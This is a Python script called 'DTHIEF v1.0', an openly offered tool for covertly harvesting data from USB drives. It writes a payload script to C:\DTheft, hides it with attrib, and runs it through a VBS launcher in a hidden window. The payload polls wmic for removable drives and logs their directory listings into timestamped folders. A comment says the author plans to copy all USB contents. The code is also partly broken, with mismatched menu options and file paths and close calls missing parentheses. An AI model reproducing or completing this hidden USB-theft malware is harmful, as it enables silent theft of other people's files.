import os, sys
from time import sleep


runpath = r"C:\DTheft\run_dthief.vbs"


def intro():
    os.system("cls")
    animation = "#"
    print("\t"*5, animation *40, "\n","\t"*4, animation *40," "*5, "| \n", "\t"*3, animation * 10+ "     DTHIEF v1.0", "\t", animation *10, " "*11, "|\n", "\t"*2, animation *40," "*21, "| \n", "\t"*1, animation *40," "*9," |__By saad anouar__|", "\n")
    print("""\n\n\n        [Read or R] to Read about program
            [Run or Rn] to execute the program
            [stop or C] to finish the program


            >> In any-time : YOU CAN CLICK Ctrl+C on your keyboard to quite program
            """)
intro()


def sys_dthief():

    
    def Dthief_program():

        dthief = open(r"C:\DTheft\dthief.pyw", "w")
        dthief.write("""\n
import os, sys
from datetime import datetime
import os.path
from time import sleep  
import filecmp
from shutil import copy2


#path of file used
home_folder = r"c:\DTheft"
tmp_file = r"C:\Temp\log.txt"
checker = r"C:\Temp\check.txt"
driver = r"C:\Temp\driver.txt"


# random folder
now = datetime.now()
dt_string = now.strftime("%m-%d-%y %H-%M-%S")""")
        dthief.close()
        dthief = open(r"C:\DTheft\dthief.pyw", "a")
        dthief.writelines("""\nmakefolder = home_folder+"\\"+dt_string+"\\""")
        dthief.close()
        dthief = open(r"C:\DTheft\dthief.pyw", "a")
        dthief.write("""\n
while True :

    # check directory 

    if not os.path.exists(home_folder) :
        os.mkdir(home_folder) 


    # earasing file 
    def reborn():
        ''' function for delete file if exist on machine'''

        if os.path.exists(driver) :
            os.remove(driver)
        if os.path.exists(tmp_file) :
            os.remove(tmp_file)
        if os.path.exists(checker) :
            os.remove(checker)
    reborn()

    # Creat rapport drivers
    def get_driver_info() :
        ''' creat a file 'information about your driver machine' to check if USB contected'''

        string_drive = "wmic logicaldisk get caption, drivetype >"
        full_path = string_drive+driver
        os.system(full_path)
    get_driver_info()


    # Read rapport drivers and check USB Drive
    def file_drive():
        ''' function read Driver info file and check if USB connected, if True creat a file with USB information'''

        file_drive = open(r"C:\Temp\driver.txt", "r")

        for i in file_drive :
            if "2" in i :

                
                indixing = i.find("2")
                degital = int(indixing)
                drive = i[:degital]
                lecteur = drive[1]
                # creat a log file content all information about USB          
                path_dir = "dir /W "+lecteur+": >"+tmp_file
                full_path_dir = str(path_dir)
                cmd = "cmd /C" +full_path_dir
                os.system(cmd)

            
    file_drive()


    # Creat Rapport comparision
    def path_directory(): 
        ''' function search in Dthief directory the log file and comapre content with log file of USB connected  to create a result comparition file'''

        if os.path.exists(tmp_file) :

            for dirpath, dirnames, filenames in os.walk(home_folder):
                for filenames in [f for f in filenames if f.endswith("log.txt")]:
                    log = os.path.join(dirpath, filenames)
                    

                    comp = filecmp.cmp(log, tmp_file)
                    string_comp = str(comp)
                    f = open(r"C:\Temp\check.txt", "a")""")
        dthief.close()
        dthief = open(r"C:\DTheft\dthief.pyw", "a")
        dthief.writelines('''
                    f.write(string_comp+"\\n")''')
        dthief.close()
        dthief = open(r"C:\DTheft\dthief.pyw", "a")
        dthief.write("""
                    f.close
                else :
                    f3 = open(r"C:\Temp\check.txt", "a")
                    f3.write("False")
                    f3.close
    path_directory()



    def rapport_drivers():

        if os.path.exists(checker) :
            
            with open(r"C:\Temp\check.txt") as f1 :
        
                line = [i.strip() for i in f1.readlines()]
                print(line)
                if "True" in line :
                    return
                elif "True" not in line:
                    os.mkdir(makefolder)
                    copy2(tmp_file, makefolder)

                    ### command line or defin copy all object inside usb and passt them here

        elif not os.path.exists(checker):
            pass   
    

    rapport_drivers()""")
        dthief.close()
        os.system("attrib +R +H C:\DTheft\dthief.pyw")
    Dthief_program()


    def command_dthief():
        bat_file = open(r"C:\DTheft\dthief_win.bat", "w")
        bat_file.write("python C:\DTheft\dthief.pyw")
        bat_file.close()
        os.system("attrib +R +H C:\DTheft\dthief_win.bat")
    command_dthief()


    def run_dthief():
        vbs_file = open(r"C:\DTheft\dthief_run.vbs", "w")
        vbs_file.write(r'''Set oShell = CreateObject ("Wscript.Shell") 
    Dim strArgs
    strArgs = "cmd /c C:\DTheft\dthief_win.bat"
    oShell.Run strArgs, 0, false
    ''')
        vbs_file.close()
        os.system(r"attrib +R +H C:\DTheft\dthief_run.vbs")
    run_dthief()
    

while True :
    intro()
    choose = input("choose option : ")

    if choose == "--run" or choose == "--RUN":

        if os.path.exists(r"C:\DTheft\dthief_run.vbs") and os.path.exists(r"C:\DTheft\dthief_win.bat") and os.path.exists(r"C:\DTheft\dthief.pyw"):
            os.system("cls")
            print("\n"*10, " "*15," Dthief ACTIVTED SUCCESSFULY")
            sleep(2.0)
            os.system("start C:\DTheft\dthief_run.vbs")
            os.system("cls")
            print("\n"*10, " "*15," Dthief ACTIVTED SUCCESSFULY")
            sleep(2.0)

        else :
            sys_dthief()
            os.system("start C:\DTheft\dthief_run.vbs")
            os.system("cls")
            print("\n"*10, " "*15," Dthief ACTIVTED SUCCESSFULY")
            sleep(2.0)

    elif choose == "--stop" or choose == "--kill":
        os.system("cls")
        print(" == >> Program stoped :( ")
        print("\n"*6, " "*5, "THANKS FOR USING MY PROGRAM 'Dthief v1' :) ", "\n", " "*19, "HOPE YOU LIKE IT", "\n", " "*19, "developed by : Saad Anouar", "\n"*4)
        
        sleep(4.0)
        os.system("taskkill /F /IM Python.exe")

        


